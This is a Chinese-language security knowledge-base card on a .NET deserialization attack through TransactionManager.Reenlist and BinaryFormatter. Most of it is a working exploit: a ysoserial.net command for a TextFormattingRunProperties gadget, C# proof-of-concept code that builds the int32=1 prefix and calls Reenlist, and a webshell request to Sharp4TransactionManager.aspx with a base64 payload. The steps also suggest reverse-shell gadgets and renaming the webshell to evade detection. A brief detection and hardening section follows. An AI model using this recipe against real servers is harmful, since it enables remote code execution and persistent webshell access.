---
id: web-dotnet-deser-transactionmanager-reenlist-binaryformatter-rce
title: .NET TransactionManager.Reenlist 分布式事务反序列化：int32=1 前缀校验后用 BinaryFormatter 还原事务数据触发 RCE（含 Sharp4TransactionManager.aspx Webshell）
type: scenario
domain: web
path: web/dotnet/deserialization
technique: transactionmanager-reenlist-binaryformatter-deserialization
tags:
- dotnet
- deserialization
- binaryformatter
- transactions
- reenlist
- ysoserial
- webshell
- rce
- aspx
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V595
  verified_at: '2026-11-12T15:51:44+08:00'
  notes: 已对照原文与4张图逐张核对：图01 ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c calc；图02 dnSpy 中 TransactionManager.Reenlist 的 MemoryStream/BinaryReader.ReadInt32/num==1 校验；图03 OletxTransactionManager.ReenlistTransaction 调用 OletxResourceManager.Reenlist(recoveryInformation.Length, recoveryInformation, enlistmentNotification)；图04 RuntimeSerialization.InternalDeserialize→ObjectManager 反序列化链与计算器弹出，均与卡片一致。核对 Webshell con 示例：base64 解码 915 字节，首 4 字节 00 01 00 00（小端 int32=0x100），是标准 BinaryFormatter 流，直接传入过不了 num==1，故页面内部须补 5 字节前缀——已据此修正卡片 Webshell 变体与步骤3的表述。dedup 唯一 duplicate 为卡片自身，其余候选（ViewState TextFormattingRunProperties 仅共享 gadget；U9/Remoting/Kingdee/ERP 等为其它 BinaryFormatter sink）均非同链；dup-scan 无涉及本卡 pair。原文无 CVE、未给受影响版本（.NET Framework 通用 API 风险），未设 affected_versions；frontmatter 无 sources/source_url（库内既有验证卡惯例）。未复跑 PoC。
url: /docs/web/dotnet/deserialization/web-dotnet-deser-transactionmanager-reenlist-binaryformatter-rce/
draft: false
kb_aliases:
- TransactionManager.Reenlist
- 分布式事务反序列化
- oletxResourceManager.Reenlist
- BinaryFormatter 事务恢复
- Sharp4TransactionManager.aspx
- ysoserial.net TextFormattingRunProperties
- .NET 事务反序列化 Webshell
---

## 一句话结论

.NET 的 `TransactionManager.Reenlist(Guid, byte[], IEnlistmentNotification)` 会从 `recoveryInformation` 中先读一个 32 位整数并校验等于 1，随后进入 `oletxResourceManager.Reenlist`，用 `BinaryFormatter` 反序列化事务恢复数据；只要攻击者能控制该字节数组（例如应用把它封装成一个 aspx 页面参数），用 ysoserial.net 生成 `TextFormattingRunProperties` 链、在最前面补上 `int32=1` 的 5 字节前缀，即可触发反序列化 RCE；文章还给出 `Sharp4TransactionManager.aspx?con=<base64>` 形式的 Webshell 变体。

## 原理

- **入口方法**：`System.Transactions.TransactionManager.Reenlist` 用于事务参与者在恢复时重新登记。反汇编可见它创建 `MemoryStream` 包装 `recoveryInformation`，用 `BinaryReader.ReadInt32()` 读出 `num` 并检查 `num == 1`；不满足则抛 `TransactionException`。
- **进入反序列化**：校验通过后调用 `oletxTransactionManager.ReenlistTransaction(...)` 做有效性检查，再进入核心 `oletxResourceManager.Reenlist`；该方法内部构造 `BinaryFormatter` 并对恢复数据执行 `Deserialize`，用于还原事务对象。调试截图显示调用链落入 `RuntimeSerialization` 的 `ObjectManager`，即标准 BinaryFormatter 反序列化路径。
- **为什么可 RCE**：`BinaryFormatter` 从不受信任的字节流实例化类型并调用其反序列化回调，攻击者可放入 ysoserial.net 的 gadget（案例为 `TextFormattingRunProperties`，其 XAML `ObjectDataProvider` 会启动进程）。`Reenlist` 对后续数据没有类型白名单或自定义 `Binder`，等于把一个危险的反序列化 sink 暴露给了 `recoveryInformation` 的控制者。
- **前缀构造**：为了让 `ReadInt32()` 读到 1，文章在 ysoserial 生成的 BinaryFormatter payload 前补 5 字节：`newSerializedData[0] = 1`，其余为 0，payload 从偏移 5 复制。这样流的前 4 字节构成小端 `int32 = 1`，校验通过，后续偏移上仍是 BinaryFormatter 可解析的序列化数据。
- **Webshell 变体**：`Sharp4TransactionManager.aspx` 把请求参数 `con`（base64 编码的原始 BinaryFormatter 载荷，示例解码后首 4 字节为 `00 01 00 00`，即小端 int32=0x100）解码后，须按上文同样补 5 字节前缀（`newSerializedData[0]=1`、载荷从偏移 5 开始）再交给 `TransactionManager.Reenlist`，否则过不了 `num==1` 校验；访问 `Sharp4TransactionManager.aspx?con=AAEAAAD...` 即触发反序列化，案例载荷执行 `cmd /c winver`。文章称 base64 + ysoserial 生成格式让样本更易绕过杀软（该免杀说法未独立验证）。
- **利用前提**：目标需存在该 gadget 依赖的程序集（案例载荷引用了 `Microsoft.PowerShell.Editor` 与 `Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties`）；缺失时可换其它 BinaryFormatter gadget（TypeConfuseDelegate、ActivitySurrogateSelector 等）。

## 触发条件

- 应用把攻击者可控数据传给 `TransactionManager.Reenlist` 的 `recoveryInformation` 参数（自研接口、反序列化封装页面、Webshell 等）。
- 目标为 .NET Framework，`System.Transactions` 可用，且 `BinaryFormatter` 未被禁用/替换（.NET Framework 默认可用；.NET 5+ 默认禁用）。
- 反序列化流中的 gadget 类型在其程序集加载范围内（如 WPF/VS/PowerShell Editor 相关程序集），否则需更换 gadget。
- 应用进程权限决定命令执行权限（IIS 应用池身份常见为低权，但足以落地 Webshell/横向）。

## 利用步骤

1. 用 ysoserial.net 生成 BinaryFormatter 载荷（案例执行 calc）：
   ```text
   ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c calc
   ```
2. base64 解码得到 `serializedData`，按 Reenlist 的校验要求在前面补 5 字节并复制：
   ```csharp
   byte[] serializedData = Convert.FromBase64String(payload);
   byte[] newSerializedData = new byte[serializedData.Length + 5];
   serializedData.CopyTo(newSerializedData, 5);
   newSerializedData[0] = 1;                 // 让 ReadInt32() == 1
   TestMe myTransactionEnlistment = new TestMe(); // 实现 IEnlistmentNotification
   TransactionManager.Reenlist(Guid.NewGuid(), newSerializedData, myTransactionEnlistment);
   ```
3. 若目标已有调用该 API 的页面/接口，按页面预期提交载荷：案例 `con` 为原始 ysoserial payload，由页面内部补 5 字节前缀；自写调用点时则提交上文补过前缀的字节数组。案例 Webshell 形式为：
   ```text
   https://target/Sharp4TransactionManager.aspx?con=<base64 payload>
   ```
4. 观察命令执行效果（案例弹出 winver/启动计算器）；实战中换成落地 Webshell、反弹 Shell 或命令回显的 gadget。
5. 若无现成页面，需要有任意文件写入/代码执行能力才能投放调用 Reenlist 的 aspx；该漏洞本身要求应用已经暴露该 sink。

## PoC

```csharp
using System;
using System.Transactions;

class TestMe : IEnlistmentNotification {
    public void Prepare(PreparingEnlistment preparingEnlistment) { }
    public void Commit(Enlistment enlistment) { }
    public void Rollback(Enlistment enlistment) { }
    public void InDoubt(Enlistment enlistment) { }
}

class Program {
    static void Main(string[] args) {
        string payload = args[0];                 // ysoserial.net -o base64 输出
        byte[] serializedData = Convert.FromBase64String(payload);
        byte[] newSerializedData = new byte[serializedData.Length + 5];
        serializedData.CopyTo(newSerializedData, 5);
        newSerializedData[0] = 1;                 // 第一个 int32 必须为 1
        TransactionManager.Reenlist(Guid.NewGuid(), newSerializedData, new TestMe());
    }
}
```

```text
# Webshell 用法（con 为 base64 的 BinaryFormatter 载荷）
GET /Sharp4TransactionManager.aspx?con=AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3Is... HTTP/1.1
Host: target
```

案例在调试器中确认 `oletxResourceManager.Reenlist` 进入 BinaryFormatter 并触发 `TextFormattingRunProperties` 反序列化；Webshell 执行 `cmd /c winver`。未在本机复跑。

## 变体与关联

- 关联：[[web-dotnet-deser-viewstate-machinekey-textformattingrunproperties]]（同 TextFormattingRunProperties gadget，入口为 ViewState）。
- 关联：[[web-dotnet-deser-u9-datatransfer-binaryformatter-rce]]、[[web-dotnet-deser-remoting-typefilterlevel-full]]（其它 BinaryFormatter sink：导入包解析、.NET Remoting）。
- 关联：[[web-dotnet-deser-activitysurrogateselector-disable-typecheck-bypass]]（gadget 类型检查绕过）。
- 变体：其它 `System.Transactions`/OLE TX 恢复路径（`ReenlistTransaction`、资源管理器恢复）若同样把外部输入交给 BinaryFormatter，也可作为 sink。
- 变体：把 `con` 载荷换成命令回显 gadget、TypeConfuseDelegate 或自定义 Binder 链；Webshell 页面可改名/混淆以规避特征。
- 边界：.NET Core/.NET 5+ 默认禁用 BinaryFormatter；目标缺 gadget 程序集、禁用 `System.Transactions` 或启用类型白名单时失败；该 API 不是远程默认暴露面，需要应用自身调用。

## 检测与防御

- **消除 sink**：不要对不受信任数据使用 `BinaryFormatter`；改用 `System.Text.Json`/`DataContractSerializer`（禁用类型解析）等安全序列化；若必须实现事务恢复，限制 `recoveryInformation` 的来源与长度并使用自定义安全 Binder。
- **代码审计**：搜索 `TransactionManager.Reenlist`、`ReenlistTransaction`、`BinaryFormatter.Deserialize` 的调用点，确认入参是否可达外部输入。
- **检测**：监控 w3wp/IIS 进程异常创建子进程（cmd、powershell、winver 等）；aspx 请求携带超长 base64 `con` 参数；`System.Transactions` 相关异常与 RuntimeSerialization 反序列化事件；Webshell 文件名 `Sharp4TransactionManager.aspx` 等已知特征。
- **加固**：.NET 5+ 保持 BinaryFormatter 禁用；IIS 应用池最小权限；上传目录禁止执行脚本；EDR 对反序列化 RCE 的进程链做告警。
